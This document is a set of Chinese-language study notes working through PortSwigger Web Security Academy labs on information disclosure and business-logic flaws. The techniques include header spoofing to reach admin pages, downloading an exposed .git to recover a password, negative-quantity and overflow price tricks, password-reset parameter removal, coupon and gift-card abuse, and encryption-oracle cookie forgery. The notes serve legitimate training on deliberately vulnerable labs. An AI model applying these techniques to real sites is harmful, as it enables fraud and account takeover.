This lab's administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.

To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

先登录账户 wiener，再访问 /admin ，把请求方法换成 `TRACE` 重发，观察响应包，发现返回了我们自己的 ip

<img src=".\图片\Snipaste_2023-08-07_11-55-05.png" alt="Snipaste_2023-08-07_11-55-05" style="zoom:80%;" />

于是再请求头里加上 `X-Custom-IP-Authorization: 127.0.0.1` 试试，于是看到管理员页面

<img src=".\图片\Snipaste_2023-08-07_11-57-15.png" alt="Snipaste_2023-08-07_11-57-15" style="zoom:80%;" />

接下来操作功能点即可

## Lab5

### 前置

#### Version control history

Virtually all websites are developed using some form of version control system, such as Git. By default, a Git project stores all of its version control data in a folder called `.git`. Occasionally, websites expose this directory in the production environment. In this case, you might be able to access it by simply browsing to `/.git`.

While it is often impractical to manually browse the raw file structure and contents, there are various methods for downloading the entire `.git` directory. You can then open it using your local installation of Git to gain access to the website's version control history. This may include logs containing committed changes and other interesting information.

This might not give you access to the full source code, but comparing the diff will allow you to read small snippets of code. As with any source code, you might also find sensitive data hard-coded within some of the changed lines.

### 题目

```
Lab: Information disclosure in version control history
PRACTITIONER

This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the administrator user then log in and delete the user carlos.
```

### 答案

这题是 git 泄露，与 git 的操作

<img src=".\图片\Snipaste_2023-08-07_12-05-33.png" alt="Snipaste_2023-08-07_12-05-33" style="zoom:67%;" />

先下载 `.git`

```bash
wget -r https://0ab4007a0457193a80a8493f00e90019.web-security-academy.net/.git
```

先进入到文件夹中）

```lua
git status  （用于显示工作目录和暂存区的状态）
```

<img src=".\图片\Snipaste_2023-08-07_12-08-05.png" alt="Snipaste_2023-08-07_12-08-05" style="zoom:80%;" />

仔细查看更改后的admin.conf文件的差异（提交用环境变量ADMIN_PASSWORD替换了硬编码的管理员密码。但硬编码密码在diff中仍然清晰可见）

消息提示：“从配置中删除管理员密码”（删除了2个admin文件）

git log命令：用于显示提交日志信息

```
git log
```

<img src=".\图片\Snipaste_2023-08-07_12-09-07.png" alt="Snipaste_2023-08-07_12-09-07" style="zoom:80%;" />

git diff 命令：显示已写入暂存区和已经被修改但尚未写入暂存区文件的区别

```cobol
git diff + 文件名（第二个）
我的是：
git diff a4f7894ca6f23fcb4e4a73b8a5b36993e4de9ce6
```

<img src=".\图片\Snipaste_2023-08-07_12-10-22.png" alt="Snipaste_2023-08-07_12-10-22" style="zoom:80%;" />

找到 管理员密码

```
ynk80n3p1nejgm2taovg
```

再登录 administrator 触发管理员的删除用户操作便完成了题目

# Business logic vulnerabilities

## Lab1

### 前置

#### Excessive trust in client-side controls

A fundamentally flawed assumption is that users will only interact with the application via the provided web interface. This is especially dangerous because it leads to the further assumption that client-side validation will prevent users from supplying malicious input. However, an attacker can simply use tools such as Burp Proxy to tamper with the data after it has been sent by the browser but before it is passed into the server-side logic. This effectively renders the client-side controls useless.

Accepting data at face value, without performing proper integrity checks and server-side validation, can allow an attacker to do all kinds of damage with relatively minimal effort. Exactly what they are able to achieve is dependent on the functionality and what it is doing with the controllable data. In the right context, this kind of flaw can have devastating consequences for both business-related functionality and the security of the website itself.

### 题目

```
Lab: Excessive trust in client-side controls
APPRENTICE

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

典中典之买东西修改价格

<img src=".\图片\Snipaste_2023-08-07_12-35-12.png" alt="Snipaste_2023-08-07_12-35-12" style="zoom:80%;" />

把价格改为 1

<img src=".\图片\Snipaste_2023-08-07_12-35-02.png" alt="Snipaste_2023-08-07_12-35-02" style="zoom:80%;" />

查看购物车

<img src=".\图片\Snipaste_2023-08-07_12-38-50.png" alt="Snipaste_2023-08-07_12-38-50" style="zoom:80%;" />

再购买即可完成题目

<img src=".\图片\Snipaste_2023-08-07_12-40-02.png" alt="Snipaste_2023-08-07_12-40-02" style="zoom:80%;" />

## Lab2

### 前置

#### Failing to handle unconventional input

One aim of the application logic is to restrict user input to values that adhere to the business rules. For example, the application may be designed to accept arbitrary values of a certain data type, but the logic determines whether or not this value is acceptable from the perspective of the business. Many applications incorporate numeric limits into their logic. This might include limits designed to manage inventory, apply budgetary restrictions, trigger phases of the supply chain, and so on.

Let's take the simple example of an online shop. When ordering products, users typically specify the quantity that they want to order. Although any integer is theoretically a valid input, the business logic might prevent users from ordering more units than are currently in stock, for example.

To implement rules like this, developers need to anticipate all possible scenarios and incorporate ways to handle them into the application logic. In other words, they need to tell the application whether it should allow a given input and how it should react based on various conditions. If there is no explicit logic for handling a given case, this can lead to unexpected and potentially exploitable behavior.

For example, a numeric data type might accept negative values. Depending on the related functionality, it may not make sense for the business logic to allow this. However, if the application doesn't perform adequate server-side validation and reject this input, an attacker may be able to pass in a negative value and induce unwanted behavior.

Consider a funds transfer between two bank accounts. This functionality will almost certainly check whether the sender has sufficient funds before completing the transfer:

```
$transferAmount = $_POST['amount']; $currentBalance = $user->getBalance(); if ($transferAmount <= $currentBalance) {    // Complete the transfer } else {    // Block the transfer: insufficient funds }
```

But if the logic doesn't sufficiently prevent users from supplying a negative value in the `amount` parameter, this could be exploited by an attacker to both bypass the balance check and transfer funds in the "wrong" direction. If the attacker sent -$1000 to the victim's account, this might result in them receiving $1000 from the victim instead. The logic would always evaluate that -1000 is less than the current balance and approve the transfer.

Simple logic flaws like this can be devastating if they occur in the right functionality. They are also easy to miss during both development and testing, especially given that such inputs may be blocked by client-side controls on the web interface.

When auditing an application, you should use tools such as Burp Proxy and Repeater to try submitting unconventional values. In particular, try input in ranges that legitimate users are unlikely to ever enter. This includes exceptionally high or exceptionally low numeric inputs and abnormally long strings for text-based fields. You can even try unexpected data types. By observing the application's response, you should try and answer the following questions:

- Are there any limits that are imposed on the data?
- What happens when you reach those limits?
- Is any transformation or normalization being performed on your input?

This may expose weak input validation that allows you to manipulate the application in unusual ways. Keep in mind that if you find one form on the target website that fails to safely handle unconventional input, it's likely that other forms will have the same issues.

```
未处理非常规输入

1、数据类型：应用程序逻辑的一个目的是将用户输入限制为符合业务规则的值。如应用程序可能被设计为接受某种数据类型的任意值，但是逻辑从业务的角度确定该值是否可接受。许多应用程序将数字限制合并到其逻辑中。这可能包括为管理库存、应用预算限制、触发供应链阶段等而设计的限制。

2、限制：（以网上商店为例）订购产品时，用户通常指定他们想要订购的数量。尽管理论上任何整数都是有效的输入，但是业务逻辑可能会阻止用户订购超过当前库存的单位。

3、处理规则：要实现这样的规则，开发人员需要预测所有可能的场景，并将处理这些场景的方法合并到应用程序逻辑中。即它们需要告诉应用程序是否应该允许给定的输入，以及它应该如何基于各种条件做出反应。如果没有用于处理给定情况的显式逻辑，则可能导致意外和潜在的可利用行为。

4、示例：数字数据类型可能接受负值。根据相关功能的不同，业务逻辑允许这样做可能没有意义。但如果应用程序没有执行足够的服务器端验证并拒绝此输入，攻击者可能会传入负值并引发不需要的行为。

1）两个银行帐户之间的资金转帐。此功能几乎肯定会在完成转账之前检查发送方是否有足够的资金

2）但如果逻辑不足以防止用户在amount数量参数修改，攻击者可以利用此漏洞绕过余额检查并向"错误"方向转移资金。如果攻击者向受害者的帐户发送了-1000，这可能会导致他们从受害者那里收到1000。该逻辑将始终计算-1000小于当前余额，并批准转帐。

3）像这样简单的逻辑缺陷如果出现在正确的功能中，可能是毁灭性的。在开发和测试过程中，它们也很容易被忽略，特别是在Web界面上的客户端控件可能会阻止此类输入的情况下。 
 

4）尝试输入合法用户不太可能输入的范围。这包括异常高或异常低的数字输入以及基于文本的字段的异常长的字符串。您甚至可以尝试意外的数据类型。通过观察应用程序的响应（考虑限制、极限、转化、规范化）
```

### 题目

```
Lab: High-level logic vulnerability
APPRENTICE

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

把 `quantity` 改为 -1，多点几次重发

<img src=".\图片\Snipaste_2023-08-07_12-53-28.png" alt="Snipaste_2023-08-07_12-53-28" style="zoom:80%;" />

发现价格为负数了

<img src=".\图片\Snipaste_2023-08-07_12-54-40.png" alt="Snipaste_2023-08-07_12-54-40" style="zoom:80%;" />

但是这里负数价格是不让支付的，那么我们加上其它产品的 quantity 为 负数，作为 **优惠卷** 的形式使用来减价格

<img src=".\图片\Snipaste_2023-08-07_12-57-37.png" alt="Snipaste_2023-08-07_12-57-37" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-08-07_12-58-05.png" alt="Snipaste_2023-08-07_12-58-05" style="zoom:80%;" />

## Lab3

### 题目

```
Lab: Low-level logic flaw
PRACTITIONER

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

这题要扩展思路，把数量超标，看看会出现什么情况

把商品加入购物车，抓包放到 bp 爆破模式，修改商品数量使其超标

```http
POST /cart HTTP/2
Host: 0a36003104b85c3980a0bc6e00210042.web-security-academy.net
Cookie: session=pC3lFYpYsTNMcIbX6D9zHU5MCFuC3kye
Content-Length: 39
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a36003104b85c3980a0bc6e00210042.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a36003104b85c3980a0bc6e00210042.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

productId=1&redir=PRODUCT&quantity=§1§
```

反正超标一定的数量后，价格会变为负数，这时候再加点其它商品，让总价为正数，价格又小于 100 美元即可，这是数学题，我不想搞了

<img src=".\图片\Snipaste_2023-08-07_13-31-06.png" alt="Snipaste_2023-08-07_13-31-06" style="zoom:67%;" />

## Lab4

这里我也不做了，简单写下思路

**使用指定的邮箱注册可以进入admin页面**，使用指定的 @dontwannacry.com进行注册

**漏洞在于邮箱会被截短为255字符**

所以使用@dontwannacry.com作为子域名（且保证后面的字符串被截断）

```
very-long-string@dontwannacry.com.YOUR-EMAIL-ID.web-security-academy.net
```

Make sure that the `very-long-string` is the right number of characters so that the "`m`" at the end of `@dontwannacry.com` is character 255 exactly.

## Lab5

### 前置

#### Making flawed assumptions about user behavior

One of the most common root causes of logic vulnerabilities is making flawed assumptions about user behavior. This can lead to a wide range of issues where developers have not considered potentially dangerous scenarios that violate these assumptions. In this section, we'll provide some cautionary examples of common assumptions that should be avoided and demonstrate how they can lead to dangerous logic flaws.

##### Trusted users won't always remain trustworthy

Applications may appear to be secure because they implement seemingly robust measures to enforce the business rules. Unfortunately, some applications make the mistake of assuming that, having passed these strict controls initially, the user and their data can be trusted indefinitely. This can result in relatively lax enforcement of the same controls from that point on.

If business rules and security measures are not applied consistently throughout the application, this can lead to potentially dangerous loopholes that may be exploited by an attacker.

```
对用户行为做出错误的假设
1、简述
最常见的根本原因之一逻辑脆弱性对用户行为做出错误的假设。如果开发人员没有考虑到违反这些假设的潜在危险场景，这可能会导致各种各样的问题

2、受信任的用户并非始终值得信赖
1、信任期限：应用程序可能看起来很安全，因为它们实现了看似健壮的措施来强制执行业务规则。不幸的是，一些应用程序错误地认为，在最初通过这些严格的控制之后，用户及其数据可以无限期地受到信任。这可能导致从那时起对相同控制的执行相对宽松。

2、一致性：如果在整个应用程序中没有一致地应用业务规则和安全措施，则可能会导致潜在的危险漏洞，攻击者可能会利用这些漏洞。
```

### 题目

```
Lab: Inconsistent security controls
APPRENTICE

This lab's flawed logic allows arbitrary users to access administrative functionality that should only be available to company employees. To solve the lab, access the admin panel and delete the user carlos.
```

### 答案

先注册账号，使用我们 email client 里的 邮箱地址

<img src=".\图片\Snipaste_2023-08-07_14-00-59.png" alt="Snipaste_2023-08-07_14-00-59" style="zoom:67%;" />

来到邮箱客户端，点击注册

<img src=".\图片\Snipaste_2023-08-07_14-02-07.png" alt="Snipaste_2023-08-07_14-02-07" style="zoom:80%;" />

当我们登录后修改邮箱，这次不需要验证邮箱发邮件，直接改就能成功，修改为这个公司内部能访问到 `/admin`  的邮箱

```
test@dontwannacry.com
```

<img src=".\图片\Snipaste_2023-08-07_14-05-38.png" alt="Snipaste_2023-08-07_14-05-38" style="zoom:80%;" />

于是再访问 `/admin` 触发功能点即可完成题目

## Lab6

### 前置

#### Users won't always supply mandatory input

One misconception is that users will always supply values for mandatory input fields. Browsers may prevent ordinary users from submitting a form without a required input, but as we know, attackers can tamper with parameters in transit. This even extends to removing parameters entirely.

This is a particular issue in cases where multiple functions are implemented within the same server-side script. In this case, the presence or absence of a particular parameter may determine which code is executed. Removing parameter values may allow an attacker to access code paths that are supposed to be out of reach.

When probing for logic flaws, you should try removing each parameter in turn and observing what effect this has on the response. You should make sure to:

- Only remove one parameter at a time to ensure all relevant code paths are reached.
- Try deleting the name of the parameter as well as the value. The server will typically handle both cases differently.
- Follow multi-stage processes through to completion. Sometimes tampering with a parameter in one step will have an effect on another step further along in the workflow.

This applies to both URL and `POST` parameters, but don't forget to check the cookies too. This simple process can reveal some bizarre application behavior that may be exploitable.

```
用户并不总是提供强制输入
1、数据篡改：一个误解是用户总是为强制输入字段提供值。浏览器可能会阻止普通用户提交不需要输入的表单，但正如我们所知，攻击者可以在传输过程中篡改参数。这甚至可以扩展到完全删除参数。

2、数据间的联系：在同一个服务器端脚本中实现多个函数的情况下，这是一个特殊的问题。在这种情况下，特定参数的存在与否可以确定执行哪个代码。删除参数值可能允许攻击者访问本应无法访问的代码路径

3、寻找：当探测逻辑缺陷时，应该尝试依次删除每个参数，并观察对响应的影响

    一次只移除一个参数，确保到达所有相关的代码路径
    尝试删除参数的名称和值。服务器通常会以不同的方式处理这两种情况
    遵循多阶段流程直至完成。有时候，在一个步骤中篡改参数会影响工作流中的另一个步骤

（适用于URL和POST参数，同时检查cookie）
```

### 题目

```
Lab: Weak isolation on dual-use endpoint
PRACTITIONER

This lab makes a flawed assumption about the user's privilege level based on their input. As a result, you can exploit the logic of its account management features to gain access to arbitrary users' accounts. To solve the lab, access the administrator account and delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

这题修改密码时，抓包，直接去掉原密码的字段，可能不需要原密码也能修改密码了，同时也修改 username 为 administrator

<img src=".\图片\Snipaste_2023-08-07_14-20-39.png" alt="Snipaste_2023-08-07_14-20-39" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-08-07_14-22-33.png" alt="Snipaste_2023-08-07_14-22-33" style="zoom:80%;" />

再 直接登录 administrator 用户，并操作删除 carlos 用户 即完成的题目

## Lab7

### 前置

Making assumptions about the sequence of events can lead to a wide range of issues even within the same workflow or functionality. Using tools like Burp Proxy and Repeater, once an attacker has seen a request, they can replay it at will and use forced browsing to perform any interactions with the server in any order they want. This allows them to complete different actions while the application is in an unexpected state.

To identify these kinds of flaws, you should use forced browsing to submit requests in an unintended sequence. For example, you might skip certain steps, access a single step more than once, return to earlier steps, and so on. Take note of how different steps are accessed. Although you often just submit a `GET` or `POST` request to a specific URL, sometimes you can access steps by submitting different sets of parameters to the same URL. As with all logic flaws, try to identify what assumptions the developers have made and where the attack surface lies. You can then look for ways of violating these assumptions.

Note that this kind of testing will often cause exceptions because expected variables have null or uninitialized values. Arriving at a location in a partly defined or inconsistent state is also likely to cause the application to complain. In this case, be sure to pay close attention to any error messages or debug information that you encounter. These can be a valuable source of [information disclosure](https://portswigger.net/web-security/information-disclosure), which can help you fine-tune your attack and understand key details about the back-end behavior.

```
用户并不总是按照预期的顺序
1、许多事务依赖于由一系列步骤组成的预定义工作流。Web界面通常会引导用户完成此过程，并在每次完成当前步骤时将他们带到工作流的下一步。但攻击者不一定会遵守这个预期的顺序。不考虑这种可能性可能会导致危险的缺陷，而这些缺陷可能相对容易利用

2、如许多实施双因素身份验证（2FA）的网站要求用户在一个页面上登录，然后在另一个页面上输入验证码。假设用户将始终遵循此过程直到完成，结果是不验证他们是否遵循此过程，可能会使攻击者完全绕过2FA步骤。 

3、涉及实验：身份认证漏洞-实验2：2FA简单旁路

【bp靶场portswigger-服务端2】身份认证漏洞-16个实验（全）

4、不可预测性：即使在相同的工作流或功能中，对事件的顺序进行假设也可能导致广泛的问题。使用Burp Proxy和Repeater等工具，一旦攻击者看到请求，就可以随意重放请求，并使用强制浏览以任何顺序执行与服务器的任何交互。这允许它们在应用程序处于意外状态时完成不同的操作

5、寻找缺陷：要识别这些类型的缺陷，应该使用强制浏览来以非预期的顺序提交请求。如可能跳过某些步骤、多次访问单个步骤、返回到前面的步骤等。请注意访问不同步骤的方式。尽管通常只是向特定的URL提交GET或POST请求，但有时可以通过向同一URL提交不同的参数集来访问步骤。与所有逻辑缺陷一样，尝试确定开发人员做出了哪些假设以及攻击面在哪里。然后可以寻找违反这些假设的方法

（这种测试通常会导致异常，因为预期的变量具有空值或未初始化的值。在部分定义或不一致的状态下到达某个位置也可能导致应用程序报错。在这种情况下，务必密切注意遇到的任何错误消息或调试信息。这些都是有价值的信息公开，这可以帮助微调攻击并了解有关后端行为的关键详细信息）
```

### 题目

```
Lab: Insufficient workflow validation
PRACTITIONER

This lab makes flawed assumptions about the sequence of events in the purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

这里是购买成功和购买失败的流程具有缺陷，当我们对比这两个的流程即返回包的结果，便可以看到端倪

#### 第一步

登录后，先成功正常购买便宜的商品，观察数据包的流程

先是添加到购物车，再是付款成功

<img src=".\图片\Snipaste_2023-08-07_14-37-01.png" alt="Snipaste_2023-08-07_14-37-01" style="zoom:80%;" />

得到了付完成功的请求包

```http
GET /cart/order-confirmation?order-confirmed=true HTTP/2
Host: 0a1b00ca0462658180061c3c00b200c4.web-security-academy.net
Cookie: session=O7MgQarj66bFYfFsexoDsmys01qhxqBu
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a1b00ca0462658180061c3c00b200c4.web-security-academy.net/cart
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

#### 第二步

再次购买（买不起的）贵重（超过100美元）的衣服，观察数据包

<img src=".\图片\Snipaste_2023-08-07_14-40-13.png" alt="Snipaste_2023-08-07_14-40-13" style="zoom:80%;" />

这时有个想法，假设我们把衣服添加到购物车中后，再次重发之前购买（便宜玩意儿）成功的数据包，会怎样呢？

显示付款成功

<img src=".\图片\Snipaste_2023-08-07_14-42-24.png" alt="Snipaste_2023-08-07_14-42-24" style="zoom:80%;" />

## Lab8

### 题目

```
Lab: Authentication bypass via flawed state machine
PRACTITIONER

This lab makes flawed assumptions about the sequence of events in the login process. To solve the lab, exploit this flaw to bypass the lab's authentication, access the admin interface, and delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

先是正常登录 wiener 账号

<img src=".\图片\Snipaste_2023-08-07_14-53-56.png" alt="Snipaste_2023-08-07_14-53-56" style="zoom:80%;" />

接下来我们退出重新登录，并用 bp 拦截数据包

并丢弃 `/role-selector`  数据包

先关闭浏览器接收请求

再丢掉数据包

（避免接收到报错页面）

<img src=".\图片\0c80c1164d7544f295ab91f78f9681d2.png" alt="0c80c1164d7544f295ab91f78f9681d2" style="zoom:67%;" />

<img src=".\图片\Snipaste_2023-08-07_14-55-22.png" alt="Snipaste_2023-08-07_14-55-22" style="zoom:67%;" />

回到首页，已经有admin权限

<img src=".\图片\Snipaste_2023-08-07_15-04-27.png" alt="Snipaste_2023-08-07_15-04-27" style="zoom:67%;" />

## Lab9

### 前置

#### Domain-specific flaws

In many cases, you will encounter logic flaws that are specific to the business domain or the purpose of the site.

The discounting functionality of online shops is a classic attack surface when hunting for logic flaws. This can be a potential gold mine for an attacker, with all kinds of basic logic flaws occurring in the way discounts are applied.

For example, consider an online shop that offers a 10% discount on orders over $1000. This could be vulnerable to abuse if the business logic fails to check whether the order was changed after the discount is applied. In this case, an attacker could simply add items to their cart until they hit the $1000 threshold, then remove the items they don't want before placing the order. They would then receive the discount on their order even though it no longer satisfies the intended criteria.

You should pay particular attention to any situation where prices or other sensitive values are adjusted based on criteria determined by user actions. Try to understand what algorithms the application uses to make these adjustments and at what point these adjustments are made. This often involves manipulating the application so that it is in a state where the applied adjustments do not correspond to the original criteria intended by the developers.

To identify these vulnerabilities, you need to think carefully about what objectives an attacker might have and try to find different ways of achieving this using the provided functionality. This may require a certain level of domain-specific knowledge in order to understand what might be advantageous in a given context. To use a simple example, you need to understand social media to understand the benefits of forcing a large number of users to follow you.

Without this knowledge of the domain, you may dismiss dangerous behavior because you simply aren't aware of its potential knock-on effects. Likewise, you may struggle to join the dots and notice how two functions can be combined in a harmful way. For simplicity, the examples used in this topic are specific to a domain that all users will already be familiar with, namely an online shop. However, whether you're bug bounty hunting, [pentesting](https://portswigger.net/solutions/penetration-testing), or even just a developer trying to write more secure code, you may at some point encounter applications from less familiar domains. In this case, you should read as much documentation as possible and, where available, talk to subject-matter experts from the domain to get their insight. This may sound like a lot of work, but the more obscure the domain is, the more likely other testers will have missed plenty of bugs.

```
特定领域缺陷
1、简述
1、功能导向：在许多情况下，会遇到特定于业务领域或站点用途的逻辑缺陷

2、交易功能：在线商店的折扣功能是寻找逻辑缺陷的经典攻击面。对于攻击者来说，这可能是一个潜在的金矿，在折扣应用的方式中会出现各种基本的逻辑缺陷。

3、示例：一家在线商店对超过1000美元的订单提供10%的折扣。如果业务逻辑无法检查在应用折扣后订单是否发生了更改，那么这可能会被滥用。在这种情况下，攻击者只需向购物车中添加商品，直到达到1000美元的阈值，然后在下订单之前删除不想要的商品。然后，即使订单不再满足预期标准，也会收到订单折扣

4、了解算法：应该特别注意根据用户操作确定的标准调整价格或其他敏感值的任何情况。试着了解应用程序使用什么算法来进行这些调整，以及在什么时候进行这些调整。这通常涉及操纵应用程序，以使其处于所应用的调整不对应于开发人员所期望的原始标准的状态。

5、掌握业务知识：要识别这些漏洞，需要仔细考虑攻击者可能具有的目标，并尝试使用提供的功能找到实现此目标的不同方法。这可能需要一定程度的特定领域知识，以便了解在特定情况下什么可能是有利的。举个简单的例子，你需要了解社交媒体，才能理解强迫大量用户追随你的好处

————

如果没有这方面的知识，你可能会忽视危险的行为，因为你根本没有意识到它潜在的连锁反应。同样地，你可能很难把这些点连接起来，并注意到两个功能是如何以有害的方式结合在一起的

```

### 题目

```
Lab: Flawed enforcement of business rules
APPRENTICE

This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

这题是关于购物时优惠卷的例子

未登录时也提供了优惠卷

<img src=".\图片\Snipaste_2023-08-07_15-10-54.png" alt="Snipaste_2023-08-07_15-10-54" style="zoom:80%;" />

登录后页面底端的 sign up 也可以输入邮箱领优惠卷

<img src=".\图片\Snipaste_2023-08-07_15-12-15.png" alt="Snipaste_2023-08-07_15-12-15" style="zoom:80%;" />

这里的优惠卷交替使用（连续使用同一张卷会被禁止）且可复用

<img src=".\图片\Snipaste_2023-08-07_15-15-21.png" alt="Snipaste_2023-08-07_15-15-21" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-08-07_15-16-44.png" alt="Snipaste_2023-08-07_15-16-44" style="zoom:67%;" />

## Lab10

### 题目

```
Lab: Infinite money logic flaw
PRACTITIONER

This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

This solution uses Burp Intruder to automate the process of buying and redeeming gift cards. Users proficient in Python might prefer to use the Turbo Intruder extension instead.

1. With Burp running, log in and sign up for the newsletter to obtain a coupon code, `SIGNUP30`. Notice that you can buy $10 gift cards and redeem them from the "My account" page.

2. Add a gift card to your basket and proceed to the checkout. Apply the coupon code to get a 30% discount. Complete the order and copy the gift card code to your clipboard.

3. Go to your account page and redeem the gift card. Observe that this entire process has added $3 to your store credit. Now you need to try and automate this process.

4. Study the proxy history and notice that you redeem your gift card by supplying the code in the `gift-card` parameter of the `POST /gift-card` request.

5. Go to "Project options" > "Sessions". In the "Session handling rules" panel, click "Add". The "Session handling rule editor" dialog opens.

6. In the dialog, go to the "Scope" tab. Under "URL Scope", select "Include all URLs".

7. Go back to the "Details" tab. Under "Rule actions", click "Add" > "Run a macro". Under "Select macro", click "Add" again to open the Macro Recorder.

8. Select the following sequence of requests:

   ```
   POST /cart
   POST /cart/coupon
   POST /cart/checkout
   GET /cart/order-confirmation?order-confirmed=true
   POST /gift-card
   ```

   Then, click "OK". The Macro Editor opens.

9. In the list of requests, select `GET /cart/order-confirmation?order-confirmed=true`. Click "Configure item". In the dialog that opens, click "Add" to create a custom parameter. Name the parameter `gift-card` and highlight the gift card code at the bottom of the response. Click "OK" twice to go back to the Macro Editor.

10. Select the `POST /gift-card` request and click "Configure item" again. In the "Parameter handling" section, use the drop-down menus to specify that the `gift-card` parameter should be derived from the prior response (response 4). Click "OK".

11. In the Macro Editor, click "Test macro". Look at the response to `GET /cart/order-confirmation?order-confirmation=true` and note the gift card code that was generated. Look at the `POST /gift-card` request. Make sure that the `gift-card` parameter matches and confirm that it received a `302` response. Keep clicking "OK" until you get back to the main Burp window.

12. Send the `GET /my-account` request to Burp Intruder. Use the "Sniper" attack type.

13. On the "Payloads" tab, select the payload type "Null payloads". Under "Payload settings", choose to generate `412` payloads.

14. Go to the "Resource pool" tab and add the attack to a resource pool with the "Maximum concurrent requests" set to `1`. Start the attack.

15. When the attack finishes, you will have enough store credit to buy the jacket and solve the lab.

## Lab11

### 前置

#### Providing an encryption oracle

Dangerous scenarios can occur when user-controllable input is encrypted and the resulting ciphertext is then made available to the user in some way. This kind of input is sometimes known as an "encryption oracle". An attacker can use this input to encrypt arbitrary data using the correct algorithm and asymmetric key.

This becomes dangerous when there are other user-controllable inputs in the application that expect data encrypted with the same algorithm. In this case, an attacker could potentially use the encryption oracle to generate valid, encrypted input and then pass it into other sensitive functions.

This issue can be compounded if there is another user-controllable input on the site that provides the reverse function. This would enable the attacker to decrypt other data to identify the expected structure. This saves them some of the work involved in creating their malicious data but is not necessarily required to craft a successful exploit.

The severity of an encryption oracle depends on what functionality also uses the same algorithm as the oracle.

```
提供加密预言
1、简述
1、加密复用：当用户可控制的输入被加密并且所得到的密文然后以某种方式对用户可用时，可能发生危险的情形。这种输入有时被称为“加密预言”。攻击者可以使用此输入，通过正确的算法和非对称密钥加密任意数据

2、加密载荷转移：当应用程序中有其他用户可控制的输入需要使用相同算法加密的数据时，这就变得很危险。在这种情况下，攻击者可能会使用加密oracle生成有效的加密输入，然后将其传递给其他敏感函数

3、反向功能：如果在站点上存在提供反向功能的另一个用户可控输入，则这个问题可能会变得复杂。这将使攻击者能够解密其他数据以识别预期的结构。这为他们节省了一些创建恶意数据的工作，但不一定是成功利用漏洞所必需的

4、加密oracle的严重性取决于哪些功能也使用与oracle相同的算法。 
```

### 答案

1. Log in with the "Stay logged in" option enabled and post a comment. Study the corresponding requests and responses using Burp's manual testing tools. Observe that the `stay-logged-in` cookie is encrypted.

2. Notice that when you try and submit a comment using an invalid email address, the response sets an encrypted `notification` cookie before redirecting you to the blog post.

3. Notice that the error message reflects your input from the `email` parameter in cleartext:

   ```
   Invalid email address: your-invalid-email
   ```

   Deduce that this must be decrypted from the `notification` cookie. Send the `POST /post/comment` and the subsequent `GET /post?postId=x` request (containing the notification cookie) to Burp Repeater.

4. In Repeater, observe that you can use the `email` parameter of the `POST` request to encrypt arbitrary data and reflect the corresponding ciphertext in the `Set-Cookie` header. Likewise, you can use the `notification` cookie in the `GET` request to decrypt arbitrary ciphertext and reflect the output in the error message. For simplicity, double-click the tab for each request and rename the tabs `encrypt` and `decrypt` respectively.

5. In the decrypt request, copy your `stay-logged-in` cookie and paste it into the `notification` cookie. Send the request. Instead of the error message, the response now contains the decrypted `stay-logged-in` cookie, for example:

   ```
   wiener:1598530205184
   ```

   This reveals that the cookie should be in the format `username:timestamp`. Copy the timestamp to your clipboard.

6. Go to the encrypt request and change the email parameter to `administrator:your-timestamp`. Send the request and then copy the new `notification` cookie from the response.

7. Decrypt this new cookie and observe that the 23-character "`Invalid email address: `" prefix is automatically added to any value you pass in using the `email` parameter. Send the `notification` cookie to Burp Decoder.

8. In Decoder, URL-decode and Base64-decode the cookie.

